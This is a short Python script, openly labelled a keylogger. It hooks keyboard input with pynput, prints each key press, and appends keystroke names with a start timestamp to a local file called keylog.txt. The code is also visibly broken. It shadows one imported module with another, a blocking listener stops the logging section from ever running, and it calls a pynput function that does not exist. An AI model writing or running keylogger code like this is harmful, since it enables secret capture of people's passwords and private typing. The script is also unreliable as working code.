import keyboard
import time
from pynput import keyboard

def on_press(key):
    print(f"Key pressed: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Set the log file path and name
log_file_path = "keylog.txt"

# Create the log file if it doesn't exist
with open(log_file_path, "a") as f:
    f.write("Keylogger started at {}\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))

# Define a function to log keystrokes
def log_key(event):
    with open(log_file_path, "a") as f:
        f.write("{}\n".format(event.name))

# Start the keylogger
keyboard.on_press(log_key)

# Keep the program running indefinitely
while True:
    time.sleep(1)